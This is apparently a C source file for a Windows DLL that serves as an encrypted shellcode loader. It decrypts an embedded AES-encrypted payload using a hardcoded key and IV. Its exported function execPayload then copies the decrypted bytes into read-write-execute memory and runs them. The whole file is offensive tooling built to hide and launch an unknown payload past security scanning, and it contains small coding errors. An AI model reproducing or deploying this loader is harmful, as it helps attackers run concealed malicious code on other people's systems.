
#include <stdio.h>
#include <Windows.h>

#include <Windows.h>
#include <stdio.h>
#include <bcrypt.h>
#pragma comment(lib, "Bcrypt.lib")


#define NT_SUCCESS(status)	        (((NTSTATUS)(status)) >= 0)
#define KEYSIZE		32
#define IVSIZE		16

typedef struct _AES {
	PBYTE	pPlainText;		// base address of the plain text data
	DWORD	dwPlainSize;		// size of the plain text data

	PBYTE	pCipherText;		// base address of the encrypted data
	DWORD	dwCipherSize;		// size of it (this can change from dwPlainSize in case there was padding)

	PBYTE	pKey;			// the 32 byte key
	PBYTE	pIv;			// the 16 byte iv
}AES, * PAES;

// the real decryption implemantation
BOOL InstallAesDecryption(PAES pAes) {

	BOOL				bSTATE = TRUE;

	BCRYPT_ALG_HANDLE		hAlgorithm = NULL;
	BCRYPT_KEY_HANDLE		hKeyHandle = NULL;

	ULONG				cbResult = NULL;
	DWORD				dwBlockSize = NULL;

	DWORD				cbKeyObject = NULL;
	PBYTE				pbKeyObject = NULL;

	PBYTE				pbPlainText = NULL;
	DWORD				cbPlainText = NULL;

	NTSTATUS			STATUS = NULL;

	// intializing "hAlgorithm" as AES algorithm Handle
	STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// getting the size of the key object variable *pbKeyObject* this is used for BCryptGenerateSymmetricKey function later
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// getting the size of the block used in the encryption, since this is aes it should be 16 (this is what AES does)
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// checking if block size is 16
	if (dwBlockSize != 16) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// allocating memory for the key object 
	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
	if (pbKeyObject == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// setting Block Cipher Mode to CBC (32 byte key and 16 byte Iv)
	STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// generating the key object from the aes key "pAes->pKey", the output will be saved in "pbKeyObject" of size "cbKeyObject" 
	STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// running BCryptDecrypt first time with NULL output parameters, thats to deduce the size of the output buffer, (the size will be saved in cbPlainText)
	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// allocating enough memory (of size cbPlainText)
	pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
	if (pbPlainText == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// running BCryptDecrypt second time with "pbPlainText" as output buffer
	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// cleaning up
_EndOfFunc:
	if (hKeyHandle) {
		BCryptDestroyKey(hKeyHandle);
	}
	if (hAlgorithm) {
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
	}
	if (pbKeyObject) {
		HeapFree(GetProcessHeap(), 0, pbKeyObject);
	}
	if (pbPlainText != NULL && bSTATE) {
		// if everything went well, we save pbPlainText and cbPlainText
		pAes->pPlainText = pbPlainText;
		pAes->dwPlainSize = cbPlainText;
	}
	return bSTATE;
}


// wrapper function for InstallAesDecryption that make things easier
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
	if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
		return FALSE;

	AES Aes = {
		.pKey = pKey,
		.pIv = pIv,
		.pCipherText = pCipherTextData,
		.dwCipherSize = sCipherTextSize
	};

	if (!InstallAesDecryption(&Aes)) {
		return FALSE;
	}

	*pPlainTextData = Aes.pPlainText;
	*sPlainTextSize = Aes.dwPlainSize;

	return TRUE;
}
unsigned char AesCipherText[] = {
	0x13, 0x33, 0x74, 0x2A, 0xB8, 0xDB, 0x0A, 0xD3, 0xD2, 0x2F, 0x6C, 0x8B, 0x8E, 0xC9, 0x4B, 0x25,
	0x96, 0x35, 0x14, 0xC3, 0xE9, 0xB7, 0x94, 0xBC, 0x20, 0xD8, 0xDF, 0xD6, 0x3B, 0x2E, 0xEF, 0x62,
	0x22, 0xE0, 0x40, 0x53, 0xEA, 0x39, 0x8C, 0xD8, 0x39, 0xA8, 0xE2, 0x4D, 0x73, 0x6F, 0x51, 0x8B,
	0xAF, 0xEF, 0x4C, 0x3A, 0x2E, 0x8D, 0x8D, 0x0D, 0x84, 0x6E, 0xC9, 0xF2, 0x6D, 0x05, 0x1F, 0x80,
	0x36, 0x49, 0x0F, 0x19, 0xB7, 0x67, 0xB5, 0x17, 0xA6, 0x8F, 0x85, 0x57, 0xA7, 0xB7, 0xCF, 0x49,
	0x30, 0xC3, 0x7C, 0x43, 0xE4, 0x17, 0x4D, 0x00, 0x20, 0x26, 0x8B, 0x51, 0x46, 0x49, 0x15, 0x30,
	0xA5, 0xCA, 0xE3, 0x87, 0x35, 0x57, 0xE1, 0x01, 0x9D, 0xEA, 0xFA, 0x3F, 0x4D, 0x0A, 0x57, 0x50,
	0xC5, 0x7E, 0x14, 0x3D, 0x62, 0x4C, 0x85, 0x79, 0xBA, 0x07, 0x49, 0x21, 0xAF, 0x20, 0x69, 0x15,
	0x60, 0x03, 0x83, 0x24, 0xCC, 0x25, 0x30, 0xB2, 0xF5, 0x18, 0x24, 0xD2, 0x35, 0xDF, 0x8F, 0xF8,
	0x8D, 0xA7, 0x69, 0x7F, 0x61, 0x7E, 0xEC, 0x72, 0x28, 0x57, 0xD0, 0x69, 0xB5, 0x0B, 0x14, 0xAA,
	0x28, 0xBB, 0x7B, 0x79, 0xB3, 0x76, 0xAC, 0xBB, 0xA7, 0xDE, 0x15, 0x13, 0x4F, 0xDC, 0x5A, 0x28,
	0x15, 0x50, 0x3A, 0x99, 0xB6, 0xB4, 0x85, 0xE7, 0x00, 0x1B, 0x5D, 0x17, 0x53, 0xA4, 0x38, 0xB5,
	0x36, 0x6D, 0xF6, 0x7E, 0xBF, 0xA1, 0xE4, 0x36, 0xDA, 0x23, 0x37, 0x19, 0xC6, 0xBD, 0xFA, 0x2D,
	0xE9, 0x80, 0x33, 0xB2, 0x74, 0xAF, 0x6E, 0x5C, 0x31, 0x83, 0xD3, 0x5C, 0x6E, 0xB8, 0xAE, 0x28,
	0x73, 0xF2, 0xAA, 0x54, 0x97, 0xF9, 0x3A, 0xC6, 0x83, 0xD4, 0x49, 0x95, 0xC4, 0xA7, 0x08, 0x57,
	0x51, 0xB3, 0x75, 0xAD, 0xB1, 0xE5, 0xCC, 0xEC, 0x02, 0x72, 0x15, 0x31, 0x0B, 0x36, 0x55, 0x6C,
	0x24, 0x21, 0x56, 0x67, 0x3F, 0x4D, 0xAE, 0x1D, 0x8D, 0xEE, 0x01, 0xC2, 0x8C, 0xB1, 0x29, 0x74,
	0x71, 0xDC, 0x8D, 0x1B, 0x78, 0xDE, 0x5A, 0xBB, 0xC3, 0xB9, 0xA6, 0xB3, 0x22, 0xC3, 0x00, 0x06,
	0xFC, 0x71, 0x69, 0x81, 0x35, 0x95, 0xBF, 0x28, 0xD9, 0xF0, 0x19, 0x1E, 0x0B, 0x12, 0xDD, 0x59,
	0xD2, 0x61, 0xF1, 0x2F, 0xAA, 0xF8, 0xDB, 0xD1, 0xCC, 0x88, 0x1B, 0x35, 0xCB, 0x79, 0xD3, 0xB3,
	0x71, 0xF9, 0xC7, 0xF6, 0x62, 0x53, 0x43, 0x81, 0xBC, 0x02, 0x92, 0xBA, 0x8B, 0xC5, 0xFA, 0x36,
	0xF3, 0xC0, 0x9B, 0xF1, 0xE5, 0xA1, 0x79, 0xB0, 0x73, 0x60, 0xD0, 0x70, 0x38, 0x76, 0x77, 0x5D,
	0xE8, 0x4D, 0x7A, 0x9F, 0xEF, 0xFB, 0xAB, 0x81, 0x48, 0x5C, 0x41, 0xF1, 0xE7, 0x6F, 0xFB, 0x95,
	0xAF, 0xB9, 0xFC, 0x0C, 0xAD, 0xAE, 0xA9, 0xC6, 0x81, 0x53, 0x9C, 0xB0, 0x49, 0x22, 0xE2, 0x01,
	0xCA, 0xA7, 0x62, 0x6C, 0xD1, 0xAF, 0xBA, 0x68, 0x36, 0x17, 0xBF, 0x79, 0xDC, 0x32, 0xC3, 0xD0,
	0xC7, 0xDD, 0xA1, 0x23, 0x97, 0x3E, 0xAB, 0x8D, 0x27, 0x7B, 0x7A, 0xE2, 0xCE, 0x25, 0x55, 0x82,
	0xB9, 0xF4, 0x88, 0x75, 0xBC, 0xB6, 0x6D, 0x93, 0x51, 0xE4, 0xD6, 0x9C, 0x13, 0xC0, 0x54, 0x58,
	0xC9, 0xC1, 0x55, 0x96, 0xB9, 0xE1, 0xE5, 0x19, 0xBC, 0x17, 0x6E, 0xEA, 0x6D, 0xC2, 0xE3, 0x60,
	0xDE, 0xA7, 0xFB, 0x5B, 0x3A, 0x85, 0xE3, 0x37, 0xC3, 0xB2, 0xCD, 0xB0, 0x68, 0x64, 0x46, 0xFC,
	0xDC, 0xF8, 0xBB, 0x5C, 0x74, 0x35, 0x75, 0x34, 0x38, 0x55, 0x92, 0x87, 0x14, 0xEE, 0xD4, 0x1E,
	0xDF, 0x89, 0x11, 0x00, 0x03, 0x57, 0x07, 0x6C, 0x61, 0x36, 0x24, 0x66, 0x09, 0x64, 0xD6, 0xB1,
	0xE5, 0x4E, 0xDF, 0x1A, 0xEF, 0x69, 0x4F, 0x0D, 0xB4, 0x36, 0xD9, 0x26, 0x61, 0x7C, 0xDD, 0x91 };


unsigned char AesKey[] = {
	0xEF, 0xC6, 0xAF, 0x1A, 0x16, 0x57, 0x2A, 0x5D, 0x71, 0x1C, 0x98, 0x21, 0x3D, 0xB0, 0x35, 0x80,
	0xBC, 0x9C, 0x76, 0xEC, 0x2A, 0x7A, 0x9C, 0x71, 0xF3, 0x5B, 0x8A, 0x3A, 0x23, 0x67, 0xD3, 0x57 };


unsigned char AesIv[] = {
	0x8E, 0x52, 0xF8, 0xE5, 0x77, 0xE8, 0x8F, 0x58, 0xAD, 0xCF, 0x78, 0xFD, 0xE3, 0x05, 0x90, 0xC8 };



VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0)
			printf("\n\t");

		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X ", Data[i]);
		}

		printf("};\n\n\n");

	}

}


extern __declspec(dllexport) void execPayload() {
	PVOID pPlaintext = NULL;
	DWORD dwPlainSize = NULL;
	
	if (!SimpleDecryption(AesCipherText, sizeof(AesCipherText), AesKey, AesIv, &pPlaintext, &dwPlainSize)) {
		return -1;
	}

	printf("%s", pPlaintext);
	void* exec_mem = VirtualAlloc(0, dwPlainSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(exec_mem, pPlaintext, dwPlainSize);
	((void(*)())exec_mem)();
	
}


